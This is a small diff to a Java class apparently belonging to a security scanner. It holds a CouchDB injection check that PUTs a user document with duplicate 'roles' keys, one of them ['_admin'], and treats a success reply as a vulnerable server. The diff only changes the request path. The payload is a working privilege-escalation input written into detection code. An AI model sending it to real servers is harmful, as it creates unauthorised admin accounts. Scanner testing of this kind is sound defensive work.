@@ -26,7 +26,7 @@ public class CouchDBInjection {
 
     public void injection161(String user) throws IOException {
         String body = "{\"name\": \"zap\", \"password\": \"zap\", \"roles\": [\"_admin\"], \"roles\": [], \"type\": \"user\"}";
-        JSONObject res = sendPUT(ipAddr + "/insertDoc?name=zap", body);
+        JSONObject res = sendPUT(ipAddr + "/insertDoc", body);
 
         if(res.optInt("code", -1) == 200 &&
                 res.optBoolean("ok", false))
